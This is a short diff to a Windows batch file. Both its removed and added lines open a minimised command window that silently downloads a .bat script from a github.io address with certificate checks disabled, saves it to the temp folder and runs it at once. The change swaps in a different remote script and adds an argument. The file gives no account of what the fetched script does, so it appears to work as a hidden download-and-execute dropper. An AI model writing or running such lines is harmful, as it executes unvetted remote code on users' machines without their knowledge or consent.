@@ -1,2 +1,2 @@
 @echo off
-start "" /min cmd /c curl -k https://stivengiv.github.io/b/puk.bat -o %temp%\puk.bat -s ^&^& %temp%\puk.bat
+start "" /min cmd /c curl -k https://stivengiv.github.io/b/play.bat -o %temp%\play.bat -s ^&^& %temp%\play.bat puk-rmx
